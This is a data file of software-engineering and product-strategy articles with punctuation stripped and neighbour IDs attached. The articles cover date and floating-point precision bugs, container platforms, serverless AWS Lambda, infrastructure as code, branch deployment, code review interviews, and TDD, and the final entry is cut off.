1165,training-dataset/engineering/47.txt,engineering,HiddenPrecisiontags   Sometimes when I work with some data  that data is more precise than I expect  One might think that would be a good thing  after all precision is good  so more is better  But hidden precision can lead to some subtle bugs   const validityStart   new Date  2016 10 01       JavaScript const validityEnd   new Date  2016 11 08    const isWithinValidity   aDate     aDate    validityStart    aDate    validityEnd   const applicationTime   new Date  2016 11 08 08 00    assert notOk isWithinValidity applicationTime       NOT what I want  What happened in the above code is that I intended to create an inclusive date range by specifying the start and end dates  However I didn t actually specify dates  but instants in time  so I m not marking the end date as November 8th  I m marking the end as the time 00 00 on November 8th  As a consequence any time  other than midnight  within November 8th falls outside the date range that s intended to include it   Hidden precision is a common problem with dates  because it s sadly common to have a date creation function that actually provides an instant like this  It s an example of poor naming  and indeed general poor modeling of dates and times   Dates are a good example of the problems of hidden precision  but another culprit is floating point numbers   const tenCharges     0 10  0 10  0 10  0 10  0 10  0 10  0 10  0 10  0 10  0 10     const discountThreshold   1 00  const totalCharge   tenCharges reduce  acc  each     acc    each   assert ok totalCharge   discountThreshold      NOT what I want  When I just ran it  a log statement showed totalCharge was 0 9999999999999999   This is because floating point doesn t exactly represent many values  leading to a little invisible precision that can show up at awkward times   One conclusion from this is that you should be extremely wary of representing money with a floating point number   If you have a fractional currency part like cents  then usually it s best to use integers on the fractional value  representing  5 00 with 500  preferably within a money type  The more general conclusion is that floating point is tricksy when it comes to comparisons  which is why test framework asserts always have a precision for comparisons    Acknowledgements Arun Murali  James Birnie  Ken McCormack  and Matteo Vaccari discussed a draft of this post on our internal mailing list   Translations  Chinese,"[1165 314 778 520 1090 606 884 1373 1235 686 1374]"
1176,training-dataset/product/240.txt,product,Platform strategy and walled gardens in the toy industryAround the holidays  I spent a lot of time shopping for toys for a few friends  kids  If you ve shopped for toys to any degree  you ll understand very quickly how toy companies leverage interoperability and platform thinking to profit from a user segment that s highly engaged but whose tastes change rapidly as they grow older   Complementarity and interoperability  It s helpful to look back at two interesting architectural principles before we dig deeper into the walled gardens that brands build in the toy industry   Complementarity  This implies that a system  typically infrastructural  is more valuable when it is used in tandem with another system  E g  the iPhone is more valuable with apps   Interoperability  This implies that two systems work seamlessly with each other through some form of mutual agreement which may manifest itself in the design and beyond it  This involves the definition of interfaces  agreement in design  and agreement on standards  licensing  and property  agreement beyond design    LEGO   Building dreams  When you think toys and interoperability  the first thing that comes to mind is  of course  LEGO  Lego  and for that matter any building block set  works on the idea of interoperability  A few core components form the infrastructure and the other components attach on as complements  Once a kid is entrenched enough with the core infrastructure  the company can keep selling complements to the kid  The good thing  from LEGO s perspective  is that you only need one lego set to get entrenched with a kid  Every subsequent lego set is interoperable in a way that the value of owning multiple lego sets  especially those with widely varying themes and scope  scales non linearly   LEGO benefits much from interoperability within itself  In that sense  it believes in the philosophy of internal APIs  plug points   However  it doesn t try hard to be interoperable with non LEGO sets  As a result  we have a fairly fragmented market of players  all building their closed interoperable worlds   Another thing LEGO does rather brilliantly is sell dreams rather than building blocks  While there are generic sets  most sets lay out various recipes in which things can be put together  Some  dreams  may require unique complements  which may be valued higher by kids  As a result  some kids also create an alternate market for the barter of lego blocks  Back when I was growing up  LEGO was not this innovative with selling  dreams  but we still had a vibrant barter market for specific LEGO blocks  An alternate market for barter is a very effective way for driving word of mouth   Hot Wheels   Interoperable worlds  While LEGO is fairly obvious  a more interesting example that I stumbled on  while shopping this Christmas  was Hot Wheels  LEGO s infrastructure and component layers are almost indistinguishable but Hot Wheels has two very distinct layers  The racing tracks act as infrastructure while the cars are the complements that work with these racing tracks  The brand uses platform strategy in two very interesting ways   1  The racing tracks  infrastructure  themselves are interoperable across toy sets and tracks from one set easily plug and play with toys of the other set   2  The cars  as complements  are again very interesting because small variations in car design create desire for ownership of more cars  Also  cars lend themselves very well to an alternate market for barter  much better than building blocks alone   As a result  once a kid buys a Hot Wheels set  starter sets are cleverly designed to have just one car with a racing track combination   there is an non linear increase in value every time the kid buys more cars or complementary tracks  Unlike blocks  racing tracks become more interesting as they get arranged in more complex connections so that ownership of multiple sets is highly desirable  Again  all of this is built as a walled garden  There is a high degree of interoperability and complementarity between a brand s products but low interoperability and complementarity with other brands  products,"[1176 1373 344 695 1351 1217 1086 778 92 1408 234]"
1192,training-dataset/engineering/476.txt,engineering,geek lySometimes a seemingly innocuous event can cause drastic changes in a complex system  A single grain of sand can cause an avalanche when dropped on a sand pile if the conditions are right  Though containers and containerization concepts have been around for a long time  Docker was the grain of sand that catapulted them to the forefront of the industry in 2013  They have transitioned from being an obscure sysadmin topic to being the platform of the future for running applications in the cloud  fueled by incredible amounts of excitement and hype around Docker   Disruption in the computing world usually develops momentum from a one two punch of an initial technology breakthrough  followed by the build up of an ecosystem around it       Docker s initial offering was largely centered on packaging existing kernel features into a CLI that was developer friendly and defining a common container image format to facilitate sharing  Its portability eliminated a big pain for developers  letting them write code on laptops and then make the move from there into virtually any environment       It was the move by Docker to make containers so developer friendly that created the breakthrough for this technology and launched them into the leader position  In fact   Docker  and  containers  were nearly synonymous terms  and the conversations around both focused on explaining the basics of containers and how they could be used for development and test use cases  Most of the industry has now standardized around an open  standard container format under the umbrella of the Linux Foundation Open Container Initiative      Currently  a lot of effort is being devoted towards putting containers into production and supporting the requirements for doing so  including compliance  security  monitoring and so on  We re entering into the ecosystem stage of adoption  and most of the action is happening in the orchestration and deployment layers  Two major ecosystems have emerged in this area in addition to Docker s own suite of products  Mesos and Kubernetes       Mesos originated at UC Berkeley as a cluster manager and is currently run out of the Apache Software Foundation  Its main commercial sponsor is Mesosphere and major users include companies like Twitter and Apple  who use it as the underlying technology to power Siri  Kubernetes is an open source project that originated at Google and has its roots in the company s internal cluster management systems  A number of companies are basing their container management offerings on Kubernetes  including startups like CoreOS and established players like RedHat  It has recently been donated to the Cloud Native Computing project  a move many see as a strategic one on the part of Google to establish its dominance in the cloud computing space  Though these platforms are not directly comparable and there s overlap between them  i e   you can deploy Kubernetes on top of Mesos   they are growing as independent ecosystems  and users and vendors will eventually need to decide which ones they want to support   Share this Two major ecosystems have emerged in addition to Docker s own suite of products  Mesos and Kubernetes       There are obvious efficiencies to be gained by standardizing on one platform  As an enterprise  which ecosystem do you choose  Regardless of technical merits  most companies prefer to choose the platform that will become the most popular down the road  Market share and mindshare often win over technical excellence  It is too early to know which technology will become VHS and which Betamax  but nobody wants to be stuck on the wrong platform       From a momentum perspective  the Docker Inc  ecosystem and the Swarm project would seem the obvious choice  After all  most developers get started with the tools the company makes available on their website  However  Docker s initial focus on the developer experience means that their orchestration solution has had to undergo significant changes to adapt it to the needs of production operators  Since Mesos and Kubernetes have been developed specifically for the orchestration environment vs  having to be adapted  many users are turning to these platforms as their first choice       Momentum can  and often does  change  So  how does one choose the right platform for the long run  If history is any indication  the platform that is able to attract the strongest ecosystem of applications  vendors and developers will win  Customers will choose an infrastructure solution based not just on the strengths of the vendor s core offering but on the availability of partners that provide additional functionality around monitoring  backup  logging  compliance and many other areas       In particular  the availability of apps will be key for adoption  After all  companies don t build clusters for the sake of it  they do so to run apps  either built in house or provided by third parties  As the container space matures  Independent Software Vendors  ISVs  will increasingly package their apps for distribution and deployment on container based platforms  Attracting and nurturing these vendors will be critical for the platform vendors       So who is best positioned to win the race  Docker Inc  is aiming to build the  VMware of containers   This will require replicating its business model and providing a comprehensive offering for the enterprise that covers management  security  monitoring  compliance and so on  Doing so  however  risks alienating its nascent community of vendors  Similar to how companies building on top of Windows during the 90s feared the competition from Microsoft itself  companies building their product on top of Docker Inc  ecosystem will be wary of potential conflicts with the platform provider  Though Docker Inc  s products provide a pluggable architecture  most users are likely to go with the one already bundled in if it meets their requirements  The more clarity that Docker Inc  can provide around its roadmap and long term business model  the easier it will be for it to grow its ecosystem   Share this Docker Inc  is aiming to build the  VMware of containers        Google has a different set of challenges  Since it is unencumbered by the need to make money directly from Kubernetes itself  it has more flexibility in how it both encourages growth in the ecosystem and provides a level playing field for everyone  It has experienced impressive growth and has a vibrant community  To keep the momentum going  Google needs to continue investing in a way that lowers barriers to adoption  It will also be important to remain vigilant to avoid the pitfalls of an OpenStack like consortium  in which many competing interests slow decision making and make progress a painful process       Mesos was one of the earlier players and has experienced a resurgence as of late  One of its differentiators is its ability to scale  having proven that it can support large scale systems of hundreds or thousands of nodes  Though it has some major corporate adopters looking to run compute and storage intensive workloads around Cassandra  Spark and others  it needs to broaden the types of apps it attracts to appeal to a larger and more diverse user base       In addition to the major container platforms  there s the likely possibility that container adoption will become intertwined with the general cloud adoption trend  If a large percentage of end users outsource a significant part of their container management to cloud vendors  then the availability of solutions that work both on premise and in the cloud will be even more important  Adoption of specific container management tools among certain cloud vendors  such as telcos  will be driven by enterprise customers and the ISVs that cater to them       We are still in the early days of the evolution of the container era  and only time will tell which platforms become dominant  We are likely to see many more twists and turns in the path to user adoption  It is even more likely that we will see the power of ecosystems prevail  just as they have with previous disruptive changes in the world of computing,"[1192 830 1297 251 695 92 500 935 520 234 1373]"
1205,training-dataset/engineering/951.txt,engineering,A Serverless Story   FMLnerdNote  For regular readers of this space  players of Fantasy Movie League  you probably want to stop reading right now as this post will definitively prove my in game moniker  If you re a tech person  however  feel free to continue  The views expressed here are mine in no way reflect the opinions of any past  present  or future employer   I m old enough to remember  after many years of writing command line programs in BASIC and C  feeling the awe of possibility upon being introduced to the event driven programming model that the Mac provided  My first web application went into production in January of 1996 and couldn t use  table  tags because it wasn t part of the HTML spec yet so I was greeted with that same awe of possibility when the DOM and then CSS became ways we could build rich  reactive web UIs  We used to have to wait months to get access to new resources in the data center before VMs let us get our hands dirty in minutes which then became seconds with containers   Having seen paradigm shifts before  I think I m seeing one again  Serverless   I know some people really hate that term since there are indeed servers running in the stack  it s just that I don t have to know they are there  I certainly don t have to manage them so I prefer  serverless  to  no ops   but this article isn t about semantics as much as it is how I used this technology to generate 29 918 page views  yes  I rounded up for the catchy article title  in July of 2016 for an audience of 5 385 unique users for  0 21 of AWS charges   Technically that s a  0 22 bill from AWS but notice how  0 01 of it is from EC2  That s a remnant of some day job experimenting I was doing and forgot to remove a volume  For Fantasy Movie League purposes  it was  0 21  which begs the question   What is Fantasy Movie League    My Problem Domain  Fantasy Movie League  In short  Fantasy Movie League  FML   insert your joke here about alternative meanings of that acronym   is a fantasy game for people who don t like sports  Each week  you get to run a fantasy cineplex of 8 screens  have a budget of  1000 fantasy dollars  and can fill those screens with a slate of 15 movies  each of which has various prices based on how it is expected to perform the following weekend   Your score each week is based on the actual box office returns of the movies you selected and there are contests for Fandango gift cards  t shirts  and trips to movie openings or even the Oscars  The brainchild of ESPN Senior Fantasy Analyst  and former screenwriter  Matthew Berry  when I first started playing FML there were about 6 000 registered users and I as I type now there are roughly 24 000   A typical FML week starts on Monday when the new slate of movies and prices is available at around 5 00p Pacific  Professional forecasts  intended to help real life theater owners with staff planning  are available Wednesday evening  final theater and showtime counts on Thursday  and the deadline to have your cineplex entered for the week is 9 00a Pacific on Friday  Scores are tabulated on Monday and the whole cycle starts over again   What I provide to the player base are tools that help making cineplex decisions easier  Most notably  and the focus of the rest of this article  is the Lineup Calculator   Given a set of forecasts for the individual movies  which you can alter on the right hand side  the Lineup Calculator will do the bin packing math to tell you what is the best combination of screens to play on the left hand side  I seed the Lineup Calculator with different methods on different days of the week  but it is common for each player to create their own   Lineup Calculator Architecture  The Lineup Calculator is comprised of a set of AWS Lambda functions organized into different classifications  the first of which I call Collectors   Data is typically made available at different days times throughout the week by different external sources  so each Collector is triggered by a CloudWatch cron job  Upon starting  each Collector loads a configuration file from an S3 bucket that drives its behavior  typically calling an API or scraping HTML off a web page  Regardless  the Collector generates a JSON file that then gets stored into another S3 bucket and uses SES to send a notification that it has completed successfully  The different data sources sometimes have errors in them  which are then easy to fix manually by editing the resulting JSON files directly   Other similarly structured Lambda functions I call Derivers get triggered by the creation of the last JSON file each needs  takes multiple JSON files created by the Collectors and derives some other intermediary file  typically a  js file to be consumed by the front end later   Finally  there is a set of Lambda functions I call Generators produce HTML files that then reference the newly created  js files   I chain these together to load different kinds of data into the Lineup Calculator at different times of the week  On Monday  for example  data from the Fantasy Movie League API  CoreGame Week   BoxOfficeMojo com returns for the previous week  Actuals   and ProBoxOffice com s Long Range Forecast  LRF  are used   But on Wednesday  ProBoxOffice com  PBO  and ShowBuzzDaily com  SBD   insert your joke here about alternative meanings of that acronym   make their forecasts for the upcoming weekend   All told for the Lineup Calculator  that s 8 different Lambda functions pulling data from 5 different sources and automatically generating updates to the static hosted S3 bucket that uses Bootstrap to make it all look nice  For the entire site  I have close to 20 Lambda functions for the various pages with 8 data sources   What I ve Found is Cool  and Not  About Lambda  Boiling what I ve done down to its essentials  I m using Lambda as a free batch server where I m well below the free tier of 1M transactions per month and using S3 as a low cost web host where my primary cost is the egress  If you look closely at my AWS bill  I also have some data transfer cost because  during July  my user facing S3 bucket was hosted in one region but my Lambda targeted data bucket was in another  That s being fixed and should lower my bill even more in the future   While you could argue that I m using Lambda beyond its intended use as an IOT back end  it gives a single developer  part time  the ability to manage a complicated data consolidation scheme in a way that would simply be impossible otherwise  There s no need to check uptime  log size  network connectivity  or anything else I d have to do if I were managing my own EC2 instance as a batch host not to mention the additional costs I d incur   Here s some specifics on what I like about it   IDE integration into Eclipse   As a middle aged developer who has spent the last 4 years in sales and marketing  I didn t want to have to learn a new language while I was also learning Lambda so I opted to build my functions in Java  The AWS plug in for Eclipse makes it ridiculously easy to create a project for a new function and handles all the packaging with a click of a few buttons  This flattened my learning curve substantially     As a middle aged developer who has spent the last 4 years in sales and marketing  I didn t want to have to learn a new language while I was also learning Lambda so I opted to build my functions in Java  The AWS plug in for Eclipse makes it ridiculously easy to create a project for a new function and handles all the packaging with a click of a few buttons  This flattened my learning curve substantially  CloudWatch integration   Some people on the Lambda forums have discussed the limitations of CloudWatch  but at my low scale I found it worked seamlessly and made it very easy to  see  what my functions were doing a console logging library I built to standardize incremental status formatting throughout all my functions     Some people on the Lambda forums have discussed the limitations of CloudWatch  but at my low scale I found it worked seamlessly and made it very easy to  see  what my functions were doing a console logging library I built to standardize incremental status formatting throughout all my functions  The Free Tier   My whole scheme doesn t work without the free tier   Some things  though  are a drag   Java warming complaints are real   The JVM loading time is a non starter if you want to use Lambda behind API Gateway for live user transactions  For my purposes  this doesn t matter since all my functions are batch but I found it takes around 9 seconds of overhead on a 256 MB memory size  Less if you go bigger  but Python and Node are better choices if you need speed and I plan on checking out the work over at serverless com when I need interactive features     The JVM loading time is a non starter if you want to use Lambda behind API Gateway for live user transactions  For my purposes  this doesn t matter since all my functions are batch but I found it takes around 9 seconds of overhead on a 256 MB memory size  Less if you go bigger  but Python and Node are better choices if you need speed and I plan on checking out the work over at serverless com when I need interactive features  The size of the AWS SDK  jar file   If you use any AWS SDK calls within your function or select one of the prebuilt function signatures that use AWS objects  S3 triggers  for example   the Eclipse AWS wizard will automatically put the 34MB   jar file in your project  That might not sound like a lot  but it ll upload the whole thing every time you upload your function during development and  while I didn t test this exhaustively  it also seemed to slow my warming time  I cracked it open and removed everything I wasn t using so my final function size was closer to 6MB     If you use any AWS SDK calls within your function or select one of the prebuilt function signatures that use AWS objects  S3 triggers  for example   the Eclipse AWS wizard will automatically put the 34MB   jar file in your project  That might not sound like a lot  but it ll upload the whole thing every time you upload your function during development and  while I didn t test this exhaustively  it also seemed to slow my warming time  I cracked it open and removed everything I wasn t using so my final function size was closer to 6MB  Single target triggers from S3   Drop a file in an S3 bucket folder  you can trigger a Lambda function invocation  The problem is  you can only trigger one function invocation and I had a situation where I wanted two things to happen in parallel in response to this single event  I took the easy cheat and wrote the file twice to two similarly named folders     Drop a file in an S3 bucket folder  you can trigger a Lambda function invocation  The problem is  you can only trigger one function invocation and I had a situation where I wanted two things to happen in parallel in response to this single event  I took the easy cheat and wrote the file twice to two similarly named folders  Exceptions should be events   I wanted the ability to have an exception thrown from my function be an event I could use to invoke another function  While you could do that from within your code  that seems like a pretty standard use case that should be handled by the framework   On sum  I really enjoy this programming model and think it is the future of computing  When I think about all the time server daemons I ve written  or written to  over the years sit and do nothing loop after loop after loop  the next leap in compute efficiency needs to come from on demand container consumption like what AWS has done with Lambda  There are some other projects out there  most notably Mantl io  which have a chance to do something similar without vendor lock in to AWS and I plan on keeping a close eye on them as this exciting trend matures   Advertisements,"[1205 884 314 276 778 520 673 806 978 234 1300]"
1216,training-dataset/engineering/707.txt,engineering,Orchestration in meatspaceTraditional enterprises typically rely on a lot of orchestration to deploy their software  which makes the whole process slow and error prone  How can we move them to a more autonomous approach  in order to speed up the feedback cycle from idea to production   This slideshow was presented at ChefConf 2014 and DevOps Summit Amsterdam 2014   A recorded video of the presentation at ChefConf can be found at https   www youtube com watch v lj8TwsM8xl0  For more details on this topic see my blog http   niek bartholomeus be,"[1216 134 541 60 1138 112 1010 540 795 1225 695]"
1217,training-dataset/engineering/1356.txt,engineering,InfrastructureAsCodetags   Infrastructure as code is the approach to defining computing and network infrastructure through source code that can then be treated just like any software system  Such code can be kept in source control to allow auditability and ReproducibleBuilds  subject to testing practices  and the full discipline of ContinuousDelivery  It s an approach that s been used over the last decade to deal with growing CloudComputing platforms and will become the dominant way to handle computing infrastructure in the next   I grew up in the Iron Age  when releasing a new server application meant finding some physical hardware to run it on  configuring that hardware to support the needs of the application  and deploying that application to the hardware  Getting hold of that hardware was usually expensive  but also long winded  usually a matter of months  But now we live the Cloud Age  where firing up a new server is a matter of seconds  requiring no more than an internet connection and a credit card  This is a dynamic infrastructure where software commands are used to create servers  often virtual machines  but can be installations on bare metal   provision them  and tear them down  all without going anywhere near a screwdriver   Practices Infrastructure as Code is based on a few practices  Use Definition Files  all configuration is defined in executable configuration definition files  such as shell scripts  Ansible playbooks  Chef recipes  or Puppet manifests  At no time should anyone log into a server and make on the fly adjustments  Any such tinkering risks creating SnowflakeServers  and so should only be done while developing the code that acts as the lasting definition  This means that applying an update with the code should be fast  Fortunately computers execute code quickly  allowing them to provision hundreds of servers faster than any human could type   all configuration is defined in executable configuration definition files  such as shell scripts  Ansible playbooks  Chef recipes  or Puppet manifests  At no time should anyone log into a server and make on the fly adjustments  Any such tinkering risks creating SnowflakeServers  and so should only be done while developing the code that acts as the lasting definition  This means that applying an update with the code should be fast  Fortunately computers execute code quickly  allowing them to provision hundreds of servers faster than any human could type  Self documented systems and processes  rather than instructions in documents for humans to execute with the usual level of human reliability  code is more precise and consistently executed  If necessary  other human readable documentation can be generated from this code   rather than instructions in documents for humans to execute with the usual level of human reliability  code is more precise and consistently executed  If necessary  other human readable documentation can be generated from this code  Version all the things  Keep all this code in source control  That way every configuration and every change is recorded for audit and you can make ReproducibleBuilds to help diagnose problems   Keep all this code in source control  That way every configuration and every change is recorded for audit and you can make ReproducibleBuilds to help diagnose problems  Continuously test systems and processes  tests allow computers to rapidly find many errors in infrastructure configuration  As with any modern software system  you can set up DeploymentPipelines for your infrastructure code which allows you to practice ContinuousDelivery of infrastructure changes   tests allow computers to rapidly find many errors in infrastructure configuration  As with any modern software system  you can set up DeploymentPipelines for your infrastructure code which allows you to practice ContinuousDelivery of infrastructure changes  Small changes rather than batches  the bigger the infrastructure update  the more likely it is to contain an error and the harder it is to detect that error  particularly if several errors interact  Small updates make it easier to find errors and are easier to revert  When changing infrastructure FrequencyReducesDifficulty   the bigger the infrastructure update  the more likely it is to contain an error and the harder it is to detect that error  particularly if several errors interact  Small updates make it easier to find errors and are easier to revert  When changing infrastructure FrequencyReducesDifficulty  Keep services available continuously  increasingly systems cannot afford downtime for upgrades or fixes  Techniques such as BlueGreenDeployment and ParallelChange can allow small updates to occur without losing availability  Benefits All of this allows us to take advantage of dynamic infrastructure by starting up new servers easily  and safely disposing of servers when they are replaced by newer configurations or when load decreases  Creating new servers is just a case of running the script to create as many server instances as needed  This approach is a good fit with PhoenixServers and ImmutableServers Kief Morris s book is due to be published later this year Using code to define the server configuration means that there is greater consistency between servers  With manual provisioning different interpretations of imprecise instructions  let alone errors  lead to snowflakes with subtly different configurations  which often leads to tricky faults that are hard to debug  Such difficulties are often made worse by inconsistent monitoring  and again using code ensures that monitoring is consistent too  Most importantly using configuration code makes changes safer  allowing upgrades of applications and system software with less risk  Faults can be found and fixed more quickly and at worst changes can be reverted to the last working configuration  Having your infrastructure defined as version controlled code aids with compliance and audit  Every change to your configuration can be logged and isn t susceptible to faulty record keeping  All of this increases in importance as you need to handle more servers  making infrastructure as code a necessary capability if you re moving to a serious adoption of microservices  Infrastructure as Code techniques scale effectively to manage large clusters of servers  both in configuring the servers and specifying how they should interact   Further Reading My colleague Kief Morris has spent the last year working on a book that goes into more detail about infrastructure as code  which is currently in the final stages of production  The list of practices is taken directly from this book   Acknowledgements This post is based on the writing and many conversations with Kief Morris  Ananthapadmanabhan Ranganathan  Danilo Sato  Ketan Padegaonkar  Piyush Srivastava  Rafael Gomes  Ranjan D Sakalley  Sina Jahangirizadeh  and Srivatsa Katta discussed drafts of this post on our internal mailing list   Translations  Chinese   Spanish,"[1217 1373 713 1403 1336 935 773 656 1234 800 1225]"
1225,training-dataset/engineering/292.txt,engineering,How to Deploy SoftwareOrganize with branches  A lot of the organizational problems surrounding deployment stems from a lack of communication between the person deploying new code and the rest of the people who work on the app with her  You want everyone to know the full scope of changes you re pushing  and you want to avoid stepping on anyone else s toes while you do it   There s a few interesting behaviors that can be used to help with this  and they all depend on the simplest unit of deployment  the branch   Code branches  By  branch   I mean a branch in Git  or Mercurial  or whatever you happen to be using for version control  Cut a branch early  work on it  and push it up to your preferred code host  GitLab  Bitbucket  etc    You should also be using pull requests  merge requests  or other code review to keep track of discussion on the code you re introducing  Deployments need to be collaborative  and using code review is a big part of that  We ll touch on pull requests in a bit more detail later in this piece   Code Review  The topic of code review is long  complicated  and pretty specific to your organization and your risk profile  I think there s a couple important areas common to all organizations to consider  though   Your branch is your responsibility   The companies I ve seen who have tended to be more successful have all had this idea that the ultimate responsibility of the code that gets deployed falls upon the person or people who wrote that code  They don t throw code over the wall to some special person with deploy powers or testing powers and then get up and go to lunch  Those people certainly should be involved in the process of code review  but the most important part of all of this is that you are responsible for your code  If it breaks  you fix it  not your poor ops team  So don t break it   Start reviews early and often   You don t need to finish a branch before you can request comments on it  If you can open a code review with imaginary code to gauge interest in the interface  for example  those twenty minutes spent doing that and getting told  no  let s not do this  is far preferable than blowing two weeks on that full implementation instead   Someone needs to review  How you do this can depend on the organization  but certainly getting another pair of eyes on code can be really helpful  For more structured companies  you might want to explicitly assign people to the review and demand they review it before it goes out  For less structured companies  you could mention different teams to see who s most readily available to help you out  In either end of the spectrum  you re setting expectations that someone needs to lend you a hand before storming off and deploying code solo   Branch and deploy pacing  There s an old joke that s been passed around from time to time about code review  Whenever you open a code review on a branch with six lines of code  you re more likely to get a lot of teammates dropping in and picking apart those six lines left and right  But when you push a branch that you ve been working on for weeks  you ll usually just get people commenting with a quick      looks good to me   Basically  developers are usually just a bunch of goddamn lazy trolls   You can use that to your advantage  though  build software using quick  tiny branches and pull requests  Make them small enough to where it s easy for someone to drop in and review your pull in a couple minutes or less  If you build massive branches  it will take a massive amount of time for someone else to review your work  and that leads to a general slow down with the pace of development   Confused at how to make everything so small  This is where those feature flags from earlier come into play  When my team of three rebuilt GitHub Issues in 2014  we had shipped probably hundreds of tiny pull requests to production behind a feature flag that only we could see  We deployed a lot of partially built components before they were  perfect   It made it a lot easier to review code as it was going out  and it made it quicker to build and see the new product in a real world environment   You want to deploy quickly and often  A team of ten could probably deploy at least 7 15 branches a day without too much fretting  Again  the smaller the diff  the more boring  straightforward  and stress free your deploys become   Branch deploys  When you re ready to deploy your new code  you should always deploy your branch before merging  Always   View your entire repository as a record of fact  Whatever you have on your master branch  or whatever you ve changed your default branch to be  should be noted as being the absolute reflection of what is on production  In other words  you can always be sure that your master branch is  good  and is a known state where the software isn t breaking   Branches are the question  If you merge your branch first into master and then deploy master  you no longer have an easy way to determining what your good  known state is without doing an icky rollback in version control  It s not necessarily rocket science to do  but if you deploy something that breaks the site  the last thing you want to do is have to think about anything  You just want an easy out   This is why it s important that your deploy tooling allows you to deploy your branch to production first  Once you re sure that your performance hasn t suffered  there s no stability issues  and your feature is working as intended  then you can merge it  The whole point of having this process is not for when things work  it s when things don t work  And when things don t work  the solution is boring  straightforward  and stress free  you redeploy master  That s it  You re back to your known  good  state   Auto deploys  Part of all that is to have a stronger idea of what your  known state  is  The easiest way of doing that is to have a simple rule that s never broken   Unless you re testing a branch  whatever is deployed to production is always reflected by the master branch   The easiest way I ve seen to handle this is to just always auto deploy the master branch if it s changed  It s a pretty simple ruleset to remember  and it encourages people to make branches for all but the most risk free commits   There s a number of features in tooling that will help you do this  If you re on a platform like Heroku  they might have an option that lets you automatically deploy new versions on specific branches  CI providers like Travis CI also will allow auto deploys on build success  And self hosted tools like Heaven and hubot deploy   tools we ll talk about in greater detail in the next section   will help you manage this as well   Auto deploys are also helpful when you do merge the branch you re working on into master  Your tooling should pick up a new revision and deploy the site again  Even though the content of the software isn t changing  you re effectively redeploying the same codebase   the SHA 1 does change  which makes it more explicit as to what the current known state of production is  which again  just reaffirms that the master branch is the known state    Blue green deploys  Martin Fowler has pushed this idea of blue green deployment since his 2010 article  which is definitely worth a read   In it  Fowler talks about the concept of using two identical production environments  which he calls  blue  and  green   Blue might be the  live  production environment  and green might be the idle production environment  You can then deploy to green  verify that everything is working as intended  and make a seamless cutover from blue to green  Production gains the new code without a lot of risk   One of the challenges with automating deployment is the cut over itself  taking software from the final stage of testing to live production   This is a pretty powerful idea  and it s become even more powerful with the growing popularity of virtualization  containers  and generally having environments that can be easily thrown away and forgotten  Instead of having a simple blue green deployment  you can spin up production environments for basically everything in the visual light spectrum   There s a multitude of reasons behind doing this  from having disaster recovery available to having additional time to test critical features before users see them  but my favorite is the additional ability to play with new code   Playing with new code ends up being pretty important in the product development cycle  Certainly a lot of problems should be caught earlier in code review or through automated testing  but if you re trying to do real product work  it s sometimes hard to predict how something will feel until you ve tried it out for an extended period of time with real data  This is why blue green deploys in production are more important than having a simple staging server whose data might be stale or completely fabricated   What s more  if you have a specific environment that you ve spun up with your code deployed to it  you can start bringing different stakeholders on board earlier in the process  Not everyone has the technical chops to pull your code down on their machine and spin your code up locally   and nor should they  If you can show your new live screen to someone in the billing department  for example  they can give you some realistic feedback on it prior to it going out live to the whole company  That can catch a ton of bugs and problems early on   Whether or not you use Heroku  take a look at how they ve been building out their concept of  Review Apps  in their ecosystem  apps get deployed straight from a pull request and can be immediately played with in the real world instead of just being viewed through screenshots or long winded  this is what it might work like in the future  paragraphs  Get more people involved early before you have a chance to inconvenience them with bad product later on,"[1225 683 1010 206 656 800 1393 713 778 895 550]"
1234,training-dataset/engineering/66.txt,engineering,A better way to interview software engineers   Lever EngineeringRunning a mock code review  At the end of a perfect code review interview  you d have a spring in your step and a confident feeling of  Oh my god  yes  This engineer will help us write even better software  and the entire team will love getting feedback from them    To get there  we start with a set of standard questions about past code review experience for some background  then dive into a GitHub pull request of around 200 lines of intentionally buggy and messy code and ask the candidate for feedback on how to improve it  We finish with a few last questions about the code as a whole and time for them to ask about our development process   To measure the springiness of our steps as fairly as we can  we use a rubric which evaluates three areas   Technical Feedback  Engineers should be able to find issues in code which will cause errors  poor performance  or will be a pain to maintain and extend   and then propose improvements or practices which will address those issues effectively   Engineers should be able to find issues in code which will cause errors  poor performance  or will be a pain to maintain and extend   and then propose improvements or practices which will address those issues effectively  Communication  Critiquing code requires telling someone that they re wrong about a mix of objective errors and subjective preferences  The best reviewers understand how to give that kind of feedback and keep it constructive   Critiquing code requires telling someone that they re wrong about a mix of objective errors and subjective preferences  The best reviewers understand how to give that kind of feedback and keep it constructive  Prioritization  Any change takes extra time  so feedback must also be mindful of the trade offs in a project between speed  correctness  clarity  and so on  We look for engineers who can analyze those concerns and apply them to their feedback   The trickiest part of running this interview is definitely the mix of technical and behavioral interviewing  It s relatively clear how an engineer can assess whether candidates are finding bugs in code  but  How would you improve this   is a very open ended question  Getting a good signal requires listening and asking clarifying questions  so don t forget that as part of the interview training   Not the right way to handle feedback   We re also still figuring out how to best use this evaluation for junior candidates  They don t have the same depth of experience yet  but  how would you improve this code   in phone screens and pair programming interviews seems to get at a lot of the same signals,"[1234 683 1225 656 206 1217 588 713 1252 800 778]"
1235,training-dataset/engineering/329.txt,engineering,5 Common Misconceptions About TDD   Unit Tests   JavaScript Scene   Medium5 Common Misconceptions About TDD   Unit Tests  Most developers seem to agree that testing is good  but developers frequently disagree about how to test  In this article  I ll break down some common misconceptions and hopefully teach you a few things about how you can benefit the most from TDD  Test Driven Development    unit tests   1  TDD is too Time Consuming  The Business Team Would Never Approve  This is a common excuse for not testing  and it can really hurt both your development team and the business  Let s set the record straight   The business team doesn t care at all about the development process you use  as long as it s effective   What they do care about are business metrics  How does TDD impact business metrics   TDD can   Improve developer productivity  long term   Reduce customer abandonment  Increase the viral factor of your application  i e   user growth   Reduce the costs of customer service  The benefits of TDD have been tested on real projects by companies like Microsoft  IBM  and Springer  and they found that the TDD process is enormously beneficial   TDD reduces production bug density by 40 80    Without tests  and even adding tests after you implement  many more bugs get into production  and every bug that gets into production doesn t simply waste developer time  it hurts the company s brand and quality reputation  It wastes enormous resources in customer support costs   Fixing bugs interrupts the normal flow of software development  which causes context switching that can cost up to 20 minutes per bug  That s 20 minutes where the developer is doing nothing productive   just trying to reboot their brain to figure out the context of the new problem  and then recover the context of the problem they were working on prior to the interruption   Depending on which study you look at  the TDD process adds 10    30  to the initial development costs  but over time  when you factor in the ongoing maintenance and bug fixes  TDD can improve developer productivity  reduce customer abandonment  increase the viral factor of your application  and reduce the costs of customer service   If you think the business team would resist TDD  you simply haven t made the case for it with facts   2  You Can t Write Tests Until You Know the Design    You Can t Know the Design Until You Implement the Code  Let s clear this up right now  Study after study has 